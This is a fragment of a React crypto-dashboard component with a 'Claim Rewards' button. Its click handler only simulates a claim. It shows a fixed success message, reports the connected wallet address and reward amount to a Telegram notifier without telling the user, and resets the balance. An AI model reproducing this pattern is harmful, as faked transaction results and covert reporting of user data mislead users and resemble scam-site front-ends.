                    onClick={async () => {
                      // Simulate claiming rewards
                      setTransactionStatus({
                        type: "success",
                        message: "Successfully claimed 0.0123 ETH rewards",
                      })

                      await sendTelegramNotification(`
💎 <b>Rewards Claimed</b> 💵 ❤️
👤 <b>User:</b> ${address}
💰 <b>Amount:</b> ${userRewards} ETH
⏰ <b>Time:</b> ${new Date().toISOString()}
                      `)

                      // Reset rewards
                      setUserRewards("0")
                    }}
                    style={{
                      background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
                      transition: "all 0.2s ease-in-out",
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
                      e.currentTarget.style.transform = "translateY(-1px)"
                      e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
                      e.currentTarget.style.transform = "translateY(0)"
                      e.currentTarget.style.boxShadow = "none"
                    }}
                  >
                    Claim Rewards
                  </button>
                </div>
              ) : (
                <div className="p-6 text-center">
                  <p className="text-muted-foreground">Connect your wallet to view rewards.</p>
                  <DashboardConnectWallet className="mt-4 w-full mx-auto" />
                </div>
              )}
            </motion.div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  )
}
